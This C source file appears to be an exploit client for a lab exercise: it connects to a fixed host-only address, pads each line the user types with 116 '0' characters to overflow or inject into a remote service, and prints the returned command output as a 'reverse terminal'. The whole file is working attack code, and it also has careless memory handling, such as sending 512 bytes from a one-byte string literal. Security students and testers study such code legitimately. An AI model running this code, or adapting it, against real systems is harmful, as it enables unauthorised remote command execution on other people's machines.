#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <errno.h>

#define BUFFER_SIZE 512
#define INPUT_SIZE 256
#define NUMBER_OF_0 116

int main(int argc,char* argv[]){
    //ip address and port number
    char IP_ADDRESS[]="192.168.56.101";
    uint16_t PORT_NUMBER=1234;

	//assign values
	struct sockaddr_in addr_server;
	addr_server.sin_family=AF_INET;
	addr_server.sin_port=htons(PORT_NUMBER);
	int ret=inet_pton(AF_INET,(const char *)IP_ADDRESS,(void *)&(addr_server.sin_addr));
	if(ret<0){
        fprintf(stderr, "Could not identify IP_ADDRESS: %s, %s\n", argv[0], strerror(errno));
        return -1;
    }

	//create sending send_buf
	char zeros[NUMBER_OF_0+1];
	//assign NUMBER_OF_0 times "0" to send_buf
	for(int i=0;i<NUMBER_OF_0;++i){
		zeros[i]='0';
	}
	zeros[NUMBER_OF_0]='\0';

	
	printf("The reverse terminal is open.\n");

	//get the input
	char input_buf[INPUT_SIZE];

	while(fgets(input_buf,INPUT_SIZE,stdin)!=NULL){
		//initial the send buffer with zeros
		char send_buf[BUFFER_SIZE]="";
		strcat(send_buf,(const char*)zeros);
		
		//attach the input to the send buffer
		strcat(send_buf,(const char*)input_buf);

		//create socket
		int socket_fd=socket(AF_INET, SOCK_STREAM, 0);
		if(socket_fd<0){
			fprintf(stderr, "Could not create socket: %s\n", strerror(errno));
			return -1;
		}

		//connect
		ret=connect(socket_fd,(struct sockaddr*) &addr_server,sizeof(struct sockaddr_in));
		if(ret<0){
			fprintf(stderr, "Could not connect: %s, %s\n", argv[0], strerror(errno));
			return -1;
		}

		//receive
		char recv_buf[BUFFER_SIZE];
		int recv_length=recv(socket_fd,recv_buf,BUFFER_SIZE-1,0);
		if(recv_length<0){
			goto END;
		}

		//send
		ret=send(socket_fd,(const void*)send_buf,BUFFER_SIZE,0);
		if(ret<0){
			fprintf(stderr, "Could not send: %s, %s\n", argv[0], strerror(errno));
			return -1;
		}
		
		//receive
		recv_length=recv(socket_fd,recv_buf,BUFFER_SIZE,0);
		if(recv_length<0){
			goto END;
		}

		//clear recv_buf
		recv_buf[0]='\0';

		//send nothing
		ret=send(socket_fd,(const void*)"\0",BUFFER_SIZE,0);
		if(ret<0){
			fprintf(stderr, "Could not send: %s, %s\n", argv[0], strerror(errno));
			return -1;
		}

		//receive the response of the command
		recv_length=recv(socket_fd,recv_buf,BUFFER_SIZE,0);
		if(recv_length<0){
			goto END;
		}

		//set one '\0' after the first '\n'
		char *p=strchr(recv_buf,'\n');
		*(p+1)='\0';

		printf("%s",recv_buf);
		
		END:
		//close socket
		close(socket_fd);

		//clear the input buffer
		input_buf[0]='\0';
	}
	
	printf("The reverse terminal is closed.\n");
	return 0;
};

